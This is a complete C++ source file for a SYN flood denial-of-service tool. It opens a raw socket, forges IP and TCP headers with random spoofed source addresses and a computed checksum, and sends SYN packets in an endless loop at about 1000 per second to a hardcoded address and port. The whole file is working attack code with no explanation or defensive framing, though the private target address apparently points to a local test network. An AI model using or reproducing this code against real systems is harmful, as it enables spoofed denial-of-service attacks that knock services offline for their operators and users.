// syn_flood.cpp
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <string.h>
#include <random>

using namespace std;

const char* SERVER_IP = "192.168.64.3";
const int SERVER_PORT = 8080;

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

unsigned short checksum(void* data, int length) {
    unsigned long sum = 0;
    unsigned short* buf = (unsigned short*)data;
    while (length > 1) {
        sum += *buf++;
        length -= 2;
    }
    if (length == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void syn_flood() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        cerr << "Raw socket creation failed: " << strerror(errno) << endl;
        cerr << "Note: Raw sockets require root privileges" << endl;
        return;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cerr << "Setting IP_HDRINCL failed: " << strerror(errno) << endl;
        close(sock);
        return;
    }

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(1024, 65535);

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    while (true) {
        char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
        memset(packet, 0, sizeof(packet));

        struct iphdr* iph = (struct iphdr*)packet;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(dis(gen));
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        string spoofed_ip = "10.0.0." + to_string(dis(gen) % 256);
        iph->saddr = inet_addr(spoofed_ip.c_str());
        iph->daddr = inet_addr(SERVER_IP);

        struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcph->source = htons(dis(gen));
        tcph->dest = htons(SERVER_PORT);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->urg = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 0;
        tcph->fin = 0;

        pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        char check_buffer[sizeof(pseudo_header) + sizeof(struct tcphdr)];
        memcpy(check_buffer, &psh, sizeof(pseudo_header));
        memcpy(check_buffer + sizeof(pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum(check_buffer, sizeof(check_buffer));

        if (sendto(sock, packet, ntohs(iph->tot_len), 0, 
                   (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            cerr << "Send failed: " << strerror(errno) << endl;
        }
        usleep(1000); // 1ms delay, 1000 SYNs/sec
    }
    close(sock);
}

int main() {
    cout << "Starting SYN flood attack..." << endl;
    syn_flood();
    return 0;
}
